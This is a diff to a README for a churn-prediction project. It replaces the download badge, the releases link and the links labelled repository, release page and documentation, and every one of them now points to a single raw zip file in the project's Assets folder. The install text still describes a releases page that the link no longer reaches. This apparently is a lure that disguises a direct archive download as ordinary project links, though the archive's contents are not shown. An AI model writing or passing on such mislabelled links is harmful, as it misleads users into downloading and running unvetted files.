@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases)
+[![Download](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip%https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip)](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the AI-Powered-Churn-Prediction application, you need:
 
 ## 🔍 How to Download & Install
 
-1. **Visit the Releases Page:** Click this link to access the Releases page: [Download Page](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases).
+1. **Visit the Releases Page:** Click this link to access the Releases page: [Download Page](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip).
 
 2. **Find the Latest Release:** On the Releases page, look for the latest version. You will see a list of files available for download.
 
@@ -90,8 +90,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📍 Resources
 
-- [GitHub Repository](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction)
-- [Release Page](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases)
-- [Documentation](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip)
+- [Release Page](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/PoupouL2R2/AI-Powered-Churn-Prediction/main/Assets/A-Powered-Prediction-Churn-3.8.zip)
 
 Thank you for using AI-Powered-Churn-Prediction. We hope it helps your business succeed!
